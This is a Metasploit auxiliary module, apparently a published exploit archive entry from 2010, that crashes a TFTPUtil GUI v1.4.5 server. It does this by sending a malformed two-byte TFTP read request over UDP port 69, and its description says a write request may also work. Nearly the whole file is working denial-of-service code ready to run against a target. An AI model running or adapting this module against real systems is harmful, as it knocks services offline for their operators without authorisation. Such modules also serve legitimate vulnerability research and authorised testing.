# Title: TFTPUtil GUI v1.4.5 Invalid Request DoS
# CVE-ID: ()
# OSVDB-ID: ()
# Author: Vuk Ivanovic
# Published: 2010-12-04
# Verified: yes
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
##
#
# TFTPGUI v1.4.5 Invalid Request DoS
#
# Tested on: Windows XP, SP2 (EN)
#
# Date tested: 11/27/2010
#
#
# 
# Discovered by: Vuk Ivanovic(musashi42)
# 
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::Udp
    include Msf::Auxiliary::Dos
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'TFTPGUI v1.4.5 Invalid Request DoS',
            'Description'    => %q{
                The TFTPUtil GUI server version 1.4.5 can be
                DOSed by sending a specially crafted read request. Depending
		of the setup, sending write request "\x00\x02" may also
		work. Discovered by musashi42.
                
            },
            'Author'         => 'musashi42',
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: 2 $',
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/12482'],
                    [ 'URL', 'http://www.securityfocus.com/bid/39872'],
                ],
            'DisclosureDate' => 'December 04 2010'))
 
        register_options([Opt::RPORT(69)])
    end
 
    def run
        connect_udp
        print_status("Sending read request...")
        $stuff = "\00\x01"
        udp_sock.put($stuff)       
        disconnect_udp
    end
end
